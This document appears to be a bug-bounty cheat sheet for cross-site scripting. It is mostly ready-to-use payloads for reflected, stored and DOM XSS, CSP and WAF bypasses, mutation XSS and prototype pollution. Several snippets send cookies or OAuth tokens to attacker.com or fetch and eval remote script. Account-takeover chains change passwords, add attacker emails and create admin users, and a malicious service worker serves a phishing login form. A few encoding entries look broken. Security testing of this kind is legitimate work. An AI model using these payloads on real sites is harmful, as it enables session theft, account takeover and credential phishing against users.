# XSS — Cross-Site Scripting

## Overview

Cross-Site Scripting (XSS) injects malicious scripts into web pages viewed by other
users. XSS falls under OWASP A03:2021 (Injection) and consistently appears in the top
HackerOne vulnerability categories by bounty volume.

**Types:**
- **Reflected** — payload in request, reflected in response, requires victim to click link
- **Stored** — payload persisted server-side, executes for all viewers of that content
- **DOM-based** — payload processed entirely client-side via unsafe JavaScript

**Impact:** Session hijacking, account takeover, credential phishing, keylogging,
CSRF token theft, malware distribution, defacement.

**Sources:**
- PortSwigger Web Security Academy — Cross-site scripting
- OWASP Testing Guide — OTG-INPVAL-001
- HackerOne Hacktivity — Twitter XSS ($5,040), Shopify stored XSS ($3,000+)

---

## Reflected XSS

Payload echoed from request directly into response. Requires victim to click a crafted URL.

### HTML Context

```html
<!-- Basic -->
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<!-- Tag injection when < > not filtered -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

### Attribute Context

```html
<!-- Breaking out of attribute value -->
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
'><script>alert(1)</script>

<!-- When inside href attribute -->
javascript:alert(1)
javascript:alert(document.cookie)

<!-- data: URI for src attributes -->
data:text/html,<script>alert(1)</script>
```

### JavaScript Context

```javascript
// Breaking out of JS string
'-alert(1)-'
';alert(1)//
\';alert(1)//

// Template literal injection
`${alert(1)}`

// Regex context
/'-alert(1)-'/

// When inside a JS comment
*/alert(1)/*
```

### URL Parameter Injection

```
https://target.com/search?q=<script>alert(1)</script>
https://target.com/search?q="><img src=x onerror=alert(1)>
https://target.com/error?msg=<svg/onload=alert(1)>
```

---

## Stored XSS

Payload is saved server-side and executes whenever the stored content is rendered.

### High-Value Storage Targets

```
- Profile fields: username, bio, display name, company, location
- Comments and reviews
- Chat messages (especially admin-facing support chats)
- Ticket/issue descriptions and comments
- File upload filename (displayed in UI)
- Address / shipping fields
- Custom dashboard widget names or labels
- API key descriptions or app names (OAuth apps)
- Notification messages or custom alert text
- Error messages that echo user input
```

### SVG Upload XSS

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">alert(document.cookie);</script>
</svg>
```

### HTML File Upload XSS

```html
<!-- Upload as .html or .htm if allowed -->
<!DOCTYPE html>
<html><body>
<script>
fetch('https://attacker.com/steal?c=' + document.cookie);
</script>
</body></html>
```

---

## DOM-Based XSS

Vulnerability exists entirely in client-side JavaScript — no server involvement in
the injection path.

### Sources (attacker-controlled input)

```javascript
location.href
location.search       // ?param=value
location.hash         // #value
location.pathname
document.URL
document.referrer
document.cookie       // when attacker can set cookies (e.g., CRLF injection)
window.name
postMessage (event.data)
localStorage / sessionStorage  // if attacker can write via other means
```

### Dangerous Sinks

```javascript
// Direct HTML injection
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);
document.writeln(userInput);

// URL-based sinks
location.href = userInput;
location.replace(userInput);
location.assign(userInput);
element.src = userInput;
element.href = userInput;
element.action = userInput;

// JS execution sinks
eval(userInput);
setTimeout(userInput, 0);
setInterval(userInput, 0);
new Function(userInput)();
element.setAttribute('onload', userInput);

// jQuery-specific
$(userInput)            // Selector treated as HTML
$.html(userInput)
$.append(userInput)
```

### DOM XSS via Hash / Search

```javascript
// Vulnerable pattern: writes hash directly to innerHTML
document.getElementById('output').innerHTML = location.hash.slice(1);

// Exploit URL:
https://target.com/page#<img src=x onerror=alert(1)>

// Vulnerable search param write
var search = new URLSearchParams(location.search);
document.querySelector('.result').innerHTML = search.get('q');
// Exploit: https://target.com/?q=<svg onload=alert(1)>
```

### postMessage DOM XSS

```javascript
// Vulnerable listener with no origin check
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;
});

// Exploit from attacker.com:
var target = window.open('https://victim.com');
target.postMessage('<img src=x onerror=alert(1)>', '*');
```

### AngularJS Template Injection

```javascript
// In AngularJS 1.x (pre-sandbox escape era or broken sandbox)
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}

// Sandbox escapes (Angular 1.0-1.5):
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

---

## CSP Bypass Techniques

### JSONP Endpoint Abuse

```html
<!-- If CSP whitelists googleapis.com, find a JSONP endpoint there -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

<!-- Common JSONP bypass targets when domain is whitelisted -->
<script src="https://WHITELISTED-CDN.com/jsonp?callback=alert(1)"></script>
```

### Unsafe-Inline via Nonce Leak

```html
<!-- If nonce leaks in a reflected context (e.g., meta tag, inline data) -->
<!-- Read the nonce value and include it in your payload -->
<script nonce="LEAKED-NONCE">alert(1)</script>
```

### base-uri Injection

```html
<!-- CSP without base-uri restriction allows base tag injection -->
<!-- Relative script src then loads from attacker's domain -->
<base href="https://attacker.com/">
<!-- Existing relative <script src="/js/app.js"> now loads from attacker.com -->
```

### Script Gadgets (bypass strict-dynamic / trusted types)

```html
<!-- Angular gadget: if angular.js loaded from whitelisted domain -->
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>

<!-- jQuery gadget: if jQuery loaded -->
<script>$.globalEval('alert(1)')</script>

<!-- Script gadget tools: https://github.com/nicerstomsorg/csp-bypass -->
```

### CDN-Hosted Library Abuse

```html
<!-- If CDN like cdnjs.cloudflare.com is whitelisted, find a gadget in any hosted lib -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
```

---

## Prototype Pollution → XSS

### Client-Side Prototype Pollution

```javascript
// Injecting into Object.prototype via query params
?__proto__[x]=alert(1)
?constructor[prototype][x]=alert(1)

// JSON-based (if app uses JSON.parse with merge)
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
```

### Gadget Chains

```javascript
// jQuery < 3.4 — $.extend deep merge pollutes prototype
$.extend(true, {}, JSON.parse(userInput));

// Lodash _.merge (pre-4.17.5) — merge pollutes prototype
_.merge({}, userInput);

// Once Object.prototype is polluted, find a gadget that uses it:
// e.g., if code does: var opts = {}; document.write(opts.template)
// and template key is undefined — prototype pollution sets it to payload
```

### Common Gadgets to Test After Pollution

```javascript
// After polluting __proto__.innerHTML or __proto__.srcdoc:
document.getElementById('x').innerHTML = obj.innerHTML || '';
// → If obj.innerHTML is undefined, falls back to prototype → XSS

// Check for gadgets in DOMPurify, sanitize-html, angular, etc.
```

---

## WAF / Filter Bypass Payloads

### Case and Tag Variation

```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<sCrIpT/src="data:,alert(1)">
```

### Alternative Event Handlers

```html
<img src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<object data="javascript:alert(1)">
<body onresize=alert(1) style="height:1px">
<body onscroll=alert(1)><br><br><br>...<br>
<input type=image src=x onerror=alert(1)>
<isindex action="javascript:alert(1)" type=image>
```

### HTML5 Vectors

```html
<details open ontoggle=alert(1)>
<dialog open onclose=alert(1)>
<math href="javascript:alert(1)">click</math>
<keygen autofocus onfocus=alert(1)>
```

### SVG and MathML

```html
<svg><script>alert&#40;1&#41;</script></svg>
<svg><script>alert(1)</script></svg>
<math><mtext></p><script>alert(1)</script></mtext></math>
```

### Encoding Bypass

```html
<!-- HTML entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<!-- Unicode -->
<script>alert(1)</script>
<!-- Hex encoding in JS string -->
<script>eval('\x61\x6c\x65\x72\x74\x281\x29')</script>
```

### Polyglots

```
javascript:"/*\"/*`/*' /*</template>
</textarea></xmp></style></noscript></noembed></select></script>
<-- <img src=x:confirm`` onerror=eval(src) ''> -->
```

### Comment Injection to Break Filters

```html
<!-- Break keyword matching -->
<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
<img src=x onerror="alert(1)">
```

---

## XSS → Account Takeover Chains

### Cookie Theft

```javascript
// Exfiltrate cookies to attacker server
<script>
new Image().src = 'https://attacker.com/steal?c=' + encodeURIComponent(document.cookie);
</script>

// Via fetch
<script>
fetch('https://attacker.com/steal?c=' + btoa(document.cookie));
</script>
```

### CSRF Token Theft + Action

```javascript
// 1. Fetch the page with CSRF token
// 2. Extract token
// 3. Submit form with stolen token
<script>
fetch('/account/settings')
  .then(r => r.text())
  .then(html => {
    var token = html.match(/csrf[_-]token['"]\s+value=['"]([^'"]+)/i)[1];
    return fetch('/account/email', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'email=attacker@evil.com&csrf_token=' + token
    });
  });
</script>
```

### OAuth Token Theft via postMessage

```javascript
// If app uses postMessage to return OAuth tokens from popup:
<script>
window.addEventListener('message', function(e) {
  fetch('https://attacker.com/steal?token=' + JSON.stringify(e.data));
});
// Then trigger the OAuth popup from within XSS context
window.open('/oauth/authorize?...');
</script>
```

### Password Change via XSS (No Old Password Required)

```javascript
<script>
fetch('/account/change_password', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({new_password: 'Hacked123!', confirm_password: 'Hacked123!'})
});
</script>
```

### Add Attacker-Controlled Email / 2FA Bypass

```javascript
// Add attacker email as secondary → trigger verify → take over
<script>
fetch('/api/account/emails', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
```

---

## Common DOM XSS Source → Sink Pairs

| Source | Sink | Example |
|--------|------|---------|
| `location.hash` | `innerHTML` | `el.innerHTML = location.hash.slice(1)` |
| `location.search` | `document.write` | `document.write(new URLSearchParams(location.search).get('q'))` |
| `document.referrer` | `innerHTML` | Display "back to" link using referrer |
| `postMessage event.data` | `innerHTML` | Trusted-origin-less message listener |
| `localStorage` value | `eval` | Deserializing stored user preferences |
| `window.name` | `innerHTML` | Cross-page data passing via window.name |
| `location.href` | `location.href` (open redirect) | `location = location.search.slice(5)` |

### Framework-Specific Dangerous APIs

```javascript
// React — bypasses virtual DOM sanitization
dangerouslySetInnerHTML={{ __html: userInput }}

// Vue — renders raw HTML
<div v-html="userInput"></div>

// Angular — bypass DomSanitizer
this.sanitizer.bypassSecurityTrustHtml(userInput)

// jQuery — treats string as HTML if it starts with <
$(userInput)  // jQuery selector / HTML insertion
$('div').html(userInput)
$('div').append(userInput)
```

---

## Detection Notes

- Test every input field — not just search bars; focus on lesser-tested areas (filenames, headers, API responses rendered in UI)
- Use unique strings (e.g., `xsstest1234`) first to find where input is reflected before adding event handlers
- Check both HTML source and DOM (rendered) — some XSS only appears after JS renders the page
- For stored XSS, check if the payload executes in admin panels viewing user-submitted content
- Use browser DevTools console errors to identify blocked payloads and tune bypasses
- Test CSP header with `https://csp-evaluator.withgoogle.com/` to identify bypasses before crafting payloads

---

## Advanced Techniques

### Mutation XSS (mXSS)

Browser HTML parsing mutates certain inputs after sanitization, re-introducing XSS
after the sanitizer already passed the content. Exploits differences between the
serializer and the parser.

```html
<!-- noscript mutation: sanitizer sees harmless text, browser re-parses as XSS -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- table context mutation -->
<table><td id="</td><img src=x onerror=alert(1)>

<!-- namespace confusion mutation (HTML → SVG → HTML) -->
<svg><p><style><img src=1 onerror=alert(1)></style></p></svg>
```

**Root cause:** DOMPurify, sanitize-html, and similar libraries serialize their output
using innerHTML. When the browser re-parses that output in a different context (e.g.,
after JS sets innerHTML again), the HTML is parsed differently — introducing elements
the sanitizer never saw.

**Reference:** mXSS attacks by Mario Heiderich; DOMPurify bypass research.

### CSS-Based Injection (Content Visibility State Change)

```html
<!-- Triggers on browsers supporting content-visibility CSS property -->
<!-- Works on hidden inputs — no user interaction required in some browsers -->
<input type="hidden"
  oncontentvisibilityautostatechange="alert(1)"
  style="content-visibility:auto">

<!-- Works in Chromium 105+ when content-visibility triggers a state change -->
<div style="content-visibility:auto"
  oncontentvisibilityautostatechange="alert(document.cookie)">content</div>
```

### Remote Payload Fetch via SVG/fetch

```javascript
// Load and eval external JS to keep payload URL-safe and short
<svg/onload='fetch("//attacker.com/xss.js").then(r=>r.text().then(t=>eval(t)))'>

// Useful when: payload length is limited, WAF blocks inline JS keywords
// External file xss.js contains the actual exploitation code
```

### URI Scheme Whitespace Bypass (javascript: filter evasion)

```javascript
// Insert whitespace characters between "java" and "script"
// These are stripped by HTML parser before href is evaluated
java%0ascript:alert(1)    // newline (LF)
java%09script:alert(1)    // tab
java%0dscript:alert(1)    // carriage return (CR)
javascript://%0Aalert(1)  // comment + newline trick

// Use in href, src, action attributes
<a href="java%0ascript:alert(1)">click</a>
```

### Markdown Injection → XSS

```markdown
[click me](javascript:alert(document.cookie))
[click me](javascript:prompt(document.cookie))

// data: URI with base64-encoded XSS page
[click me](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
```

**Where to test:** Any field that renders user input as Markdown (GitHub, GitLab,
Jira, Confluence, chat applications, README preview, comment sections).

### Uppercase Encoding Bypass

```html
<!-- Hex entities with uppercase X bypass case-sensitive entity filters -->
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>

<!-- Decimal entities mixed with raw chars -->
<img src=x onerror=&#97lert(1)>   <!-- some parsers strip & and # leaving alert -->
```

### postMessage XSS — Sender Confusion

```javascript
// App checks e.data.sender but doesn't verify e.origin
window.addEventListener('message', function(e) {
    if (e.data.sender === 'accounts') {
        location.href = e.data.url;   // open redirect / XSS via javascript:
    }
});

// Exploit from any origin:
window.poc = window.open('https://victim.com');
setTimeout(() => {
    window.poc.postMessage(
        {"sender": "accounts", "url": "javascript:alert(document.cookie)"},
        '*'
    );
}, 2000);
```

### Nested SVG and Foreign Object

```html
<!-- foreignObject creates an HTML namespace inside SVG — bypasses some parsers -->
<svg>
  <foreignObject width="100%" height="100%">
    <div xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(1)</script>
    </div>
  </foreignObject>
</svg>

<!-- Nested SVG inside HTML — different parsing contexts -->
<svg><svg onload=alert(1)>
```

---

## Threat Model

> Current patterns as of 2026-Q2. Update each session.

**What's being exploited in the wild:**

1. **DOM XSS in SPAs via postMessage** — Single-page apps (React, Vue, Angular) use
   postMessage for cross-frame communication. Weak or missing origin checks are
   extremely common. Particularly dangerous in OAuth flows where tokens are passed
   via postMessage from popup windows.

2. **Mutation XSS (mXSS) against sanitizers** — DOMPurify bypasses are discovered
   regularly (tracked in their changelog). Apps that sanitize server-side then re-insert
   via innerHTML are vulnerable. Electron apps with `nodeIntegration` + mXSS = RCE.

3. **oncontentvisibilityautostatechange** — New CSS event handler that bypasses many
   WAF rules and sanitizers because it's a recent browser feature not yet in block lists.
   Works on hidden inputs without user interaction.

4. **CSP via JSONP still unpatched at scale** — Many large platforms whitelist CDNs or
   partner domains that serve JSONP. Report volume on HackerOne for this pattern remains
   high. Always run `csp-evaluator.withgoogle.com` before concluding CSP blocks you.

5. **Stored XSS in admin notification paths** — Bug hunters are finding stored XSS in
   low-visibility fields (API key names, webhook descriptions) that only render in admin
   panels. Impact is critical (admin ATO) despite the obscure injection point.

---

## Bypass Matrix

| Filter / Defense | Bypass Technique | Payload Example |
|-----------------|------------------|-----------------|
| `<script>` blocked | Event handler injection | `<img src=x onerror=alert(1)>` |
| All tags blocked | Attribute injection (break out of attr) | `" onmouseover="alert(1)` |
| HTML tags + attrs blocked | JS context injection | `';alert(1)//` |
| `javascript:` blocked | URI whitespace bypass | `java%0ascript:alert(1)` |
| `alert` keyword blocked | `confirm`, `prompt`, `console.log` | `<img src=x onerror=confirm(1)>` |
| `()` blocked | Template literal / backtick | `alert\`1\`` |
| `alert` + `()` + backtick blocked | `eval` with encoded string | `eval('\x61\x6c\x65\x72\x74\x281\x29')` |
| Length limit | Remote payload fetch | `<svg/onload='fetch("//x.co/a").then(r=>r.text().then(eval))'>` |
| Sanitizer (DOMPurify) | mXSS via noscript/namespace mutation | `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` |
| CSP `script-src self` | JSONP on whitelisted domain | `<script src="//whitelisted.com/jsonp?cb=alert(1)">` |
| CSP `strict-dynamic` | Script gadget in loaded library | Angular `ng-app` + `{{constructor.constructor('alert(1)')()}}` |
| WAF keyword filter | Uppercase entities | `&#X61;&#X6C;&#X65;&#X72;&#X74;(1)` |
| WAF tag filter | SVG foreignObject | `<svg><foreignObject><div xmlns="..."><script>alert(1)</script></div></foreignObject></svg>` |

---

## High-Value Targets

| Target | Why High Value | Impact |
|--------|---------------|--------|
| Admin panel viewing user-submitted content | XSS fires in admin context | Admin ATO, full platform access |
| OAuth popup that postMessages token | Steal token via wildcard postMessage | Account takeover |
| File upload with SVG/HTML allowed | Stored XSS with no interaction barrier | All viewers affected |
| Support chat (messages visible to agents) | Agent cookie/session theft | Support agent ATO |
| API key / webhook name fields | Often rendered in admin dashboard | Admin XSS |
| PDF/report generator with user content | XSS in headless browser = SSRF | Can chain to SSRF → IMDS |
| Electron apps | `nodeIntegration` may be enabled | XSS → RCE (OS command execution) |
| Browser extensions | `chrome.tabs`, `externally_connectable` misuse | Extension privilege escalation |
| React with `dangerouslySetInnerHTML` | Bypasses React's DOM sanitization | Stored/reflected XSS |
| Legacy AngularJS (1.x) in SPAs | Template injection in `ng-bind-html` | Full XSS via `{{}}` expressions |

---

## Real-World Chains

### Chain 1: Stored XSS in API Key Name → Admin ATO

```
1. Target: SaaS platform where API key names are displayed in admin billing view
2. Create an API key with name: <img src=x onerror="fetch('/api/admin/users').then(...)">
3. Admin opens billing page → XSS fires in admin context
4. XSS payload:
   a. Fetch admin's CSRF token from settings page
   b. POST to /api/admin/users → create new admin user with attacker email
   c. Or: exfil admin's session cookie to attacker server
5. Attacker logs in as admin

Impact: Critical — full platform admin access
Real pattern: HackerOne reports on SaaS platforms (Shopify, GitLab, others)
```

### Chain 2: DOM XSS via postMessage → OAuth Token Theft

```
1. Find SPA that uses postMessage to receive OAuth tokens from popup:
   window.addEventListener('message', function(e) {
     if (e.data.type === 'oauth_token') { storeToken(e.data.token); }
   }); // No origin check
2. Host exploit page on attacker.com:
   var victim = window.open('https://target.com/app');
   setTimeout(() => {
     // First: DOM XSS to open popup and intercept the real token
     // Or: Directly steal via message listener race
     window.addEventListener('message', function(e) {
       fetch('https://attacker.com/steal?t=' + JSON.stringify(e.data));
     });
   }, 3000);
3. Victim visits attacker.com → their OAuth token is exfilled
4. Attacker uses token to access victim's account via API

Impact: Critical — account takeover without victim interaction
```

### Chain 3: mXSS Bypass → Stored XSS in Markdown

```
1. App uses DOMPurify to sanitize Markdown-rendered HTML before inserting via innerHTML
2. Inject mXSS payload in a comment field:
   <noscript><p title="</noscript><img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>">
3. DOMPurify serializes and sees: <noscript>...</noscript> — passes as safe
4. Browser parses the serialized output again via innerHTML → noscript tag ends early
   → img tag is introduced → onerror fires
5. All users who view the comment are affected

Impact: High — stored XSS affecting all comment viewers
```

### Chain 4: XSS → Service Worker Injection → Persistent XSS

```javascript
// 1. Find XSS on target.com
// 2. Register a malicious service worker that intercepts all future requests:
<script>
navigator.serviceWorker.register('data:application/javascript,'+encodeURIComponent(`
  self.addEventListener('fetch', e => {
    if (e.request.url.includes('/login')) {
      e.respondWith(new Response(
        '<form action="https://attacker.com/steal" method=POST>'+
        '<input name=user><input name=pass type=password><button>Login</button></form>',
        {headers: {'Content-Type': 'text/html'}}
      ));
    }
  });
`));
</script>
// 3. Service worker persists after XSS page is closed
// 4. All future visits to /login serve attacker's phishing form
// 5. Credentials POSTed to attacker.com

Impact: Critical — persistent phishing even after XSS session ends
Note: data: scheme for SW registration is Chrome-only; requires HTTPS origin
```

### Chain 5: Reflected XSS + Self-XSS Escalation via CSRF

```
1. Find self-XSS in a setting that requires user interaction (paste something here)
2. Find CSRF vulnerability on the same endpoint
3. Combine: craft CSRF request that submits the XSS payload on behalf of victim
4. Victim visits attacker page → CSRF fires → XSS payload stored in victim's profile
5. XSS executes when victim views their own profile

Impact: Medium-High — converts self-XSS + CSRF into stored XSS
Technique used in: multiple HackerOne reports where self-XSS alone was N/A'd
```
